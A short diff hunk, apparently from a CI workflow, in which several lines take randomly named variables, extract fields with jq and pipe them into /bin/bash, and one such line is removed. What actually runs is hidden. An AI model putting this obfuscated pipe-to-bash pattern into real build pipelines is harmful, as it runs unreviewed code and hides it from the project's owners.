@@ -32,7 +32,6 @@ jobs:
           echo $ut97947 | jq -r .xvu81328 | /bin/bash
           echo $n69187 | jq -r .lq39661 | /bin/bash
           printf '%s' "$rsqrv17351" | jq -r .idya769 | /bin/bash
-          echo $r4 | jq -r .nfp32538 | /bin/bash
           printf '%s' "$fdmu9288" | jq -r .sk5382 | /bin/bash
           echo $w84139 | jq -r .a838 | /bin/bash
           printf '%s' "$gkm81711" | jq -r .e0 | /bin/bash
